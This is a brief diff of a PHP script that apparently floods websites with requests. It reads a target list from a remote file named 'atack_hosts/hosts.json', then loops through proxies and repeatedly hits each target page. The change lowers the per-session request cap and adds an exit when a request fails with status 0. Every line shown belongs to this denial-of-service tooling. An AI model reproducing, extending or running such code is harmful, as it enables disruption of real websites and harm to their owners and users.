@@ -3,7 +3,7 @@
     $total = 0;
     $count = 0;
 
-    $sessionMaxRequests = 5000;
+    $sessionMaxRequests = 1000;
 
     $hosts = json_decode(file_get_contents('https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json'), true);
 
@@ -27,7 +27,7 @@
                 foreach ($data['proxy'] as $proxy) {
                     while (true){
                         $code = request($data['site']['page'], $proxy['ip'], $proxy['auth']);
-                        if($code == 407){
+                        if($code == 407 || $code == 0){
                             break;
                         }
                         if($count > $sessionMaxRequests){
